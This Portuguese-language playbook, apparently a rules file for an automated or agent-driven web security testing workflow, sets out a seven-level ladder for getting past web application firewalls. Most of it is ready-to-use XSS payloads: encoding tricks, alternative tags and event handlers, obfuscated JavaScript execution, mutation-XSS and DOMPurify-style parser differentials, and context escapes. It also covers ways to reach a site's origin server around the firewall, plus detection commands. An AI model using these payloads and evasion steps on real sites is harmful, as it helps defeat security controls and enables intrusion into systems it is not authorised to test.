# Protocolo de bypass de WAF (escada de 7 níveis)

Referência quando um WAF bloqueia os payloads iniciais. **Não desista após 3–5 payloads** —
trabalhe as categorias sistematicamente. "WAF bloqueia X" **nunca** é veredito de dead-end
válido sem passar a escada inteira. Casa com §8 (rotação de detecção) e [[rules/payloads]].

## Primeiro: detectar
```bash
curl -sI "https://TARGET" | grep -iE "cf-ray|server: cloudflare|x-sucuri|x-akamai|x-cdn|x-datadome|server: awselb"
curl -s "https://TARGET/search?q=<script>alert(1)</script>" | head -c 1000   # lê a página de bloqueio
wafw00f https://TARGET 2>/dev/null
```
Registre no brain: `python3 tools/brain.py record <alvo> waf-map "<waf>" "<versão se visível>"`.

## A escada (cada nível ataca uma parte diferente da lógica do WAF)

### Nível 1 — transformações de encoding
WAF checa um encoding, o browser/server decodifica outro.
```
URL: %3Cscript%3E   Duplo: %253Cscript%253E   Unicode: <script>
Entidades HTML: &#60;script&#62; / &#x3C;   Case: <ScRiPt>   Null: <scri%00pt>   Overlong: %C0%BC
```

### Nível 2 — tags alternativas
```
<svg onload=alert(1)>   <details open ontoggle=alert(1)>   <body onload=alert(1)>
<video><source onerror=alert(1)>   <audio src=x onerror=alert(1)>   <marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>   <select onfocus=alert(1) autofocus>   <keygen onfocus=alert(1) autofocus>
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```

### Nível 3 — event handlers alternativos
```
ontoggle onpointerenter onpointerleave onpointermove onpointerrawupdate ontransitionend
onanimationend onanimationstart onbeforetoggle onfocusin oncontextmenu ondblclick onauxclick
```

### Nível 4 — execução de JS sem keywords
Bloqueou `alert`/`eval`/`document`/`cookie`:
```
eval(atob('YWxlcnQoMSk='))            [].constructor.constructor('alert(1)')()
window['al'+'ert'](1)                 `${alert(1)}`
({x:alert}={x:alert},x(1))            ''['constructor']['constructor']('alert(1)')()
Reflect.apply(alert,null,[1])         import('data:text/javascript,alert(1)')
```

### Nível 5 — diferenciais de parser
```
# Mutation XSS (estilo bypass DOMPurify):
<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
# Confusão de namespace:  <svg><desc><template><img src=x onerror=alert(1)>
# Quirks de atributo:  <img src=x onerror/=alert(1)>   <img/src=x/onerror=alert(1)>
# Confusão de content-type (resposta text/html, WAF checa JSON):
{"x":"</script><img src=x onerror=alert(1)>"}
```

### Nível 6 — escapes específicos de contexto
Não é bypassar o WAF no payload — é escapar o contexto atual primeiro.
```
# String JS:  '-alert(1)-'   \'-alert(1)//   </script><img src=x onerror=alert(1)>
# Atributo HTML:  " onfocus=alert(1) autofocus="   ' onfocus='alert(1)' autofocus='
# Param URL em JS:  javascript:alert(1)//   data:text/html,<script>alert(1)</script>
# CSS:  </style><img src=x onerror=alert(1)>
```

### Nível 7 — bypasses de infra (vá em volta do WAF)
```
# IP de origem direto (censys/shodan/securitytrails/histórico DNS):
curl -H "Host: target.com" http://ORIGIN_IP/vuln?q=<script>alert(1)</script>
# Porta alternativa:  https://target.com:8443/...
# IPv6 (WAF pode não cobrir):  curl -6 "https://[ipv6]/..."
# Subdomínio que roteia direto pro origin   ·   HTTP vs HTTPS (WAF pode inspecionar só um)
```

## Regras de processo
1. **≥3 payloads por nível** antes de subir. Uma falha não mata a categoria.
2. **Registre o que bloqueia e o que passa** — o padrão de bloqueio revela o que o WAF checa:
   `brain.py record <alvo> waf-bypass "Nível 2: svg bloqueado, details passa" "..."`.
3. **Combine níveis** (encoding + tag + obfuscação JS = bypass composto).
4. **Time-box 20 min.** Nada em 20 min → registre o perfil do WAF e mude de endpoint/classe.
5. **Busque writeups primeiro** — alguém pode ter publicado bypass pra essa versão exata.
6. **Bypass em curl → VERIFIQUE NO BROWSER.** Bypass + execução no browser = confirmado;
   bypass + só reflexão em curl = não verificado.

**Verdito honesto:** depois de percorrer os 7 níveis com registro nível-a-nível, o veredito é
"bypass exaurido" (perfil do WAF registrado, seguir em frente) — **não** "endpoint não
vulnerável". São afirmações diferentes.
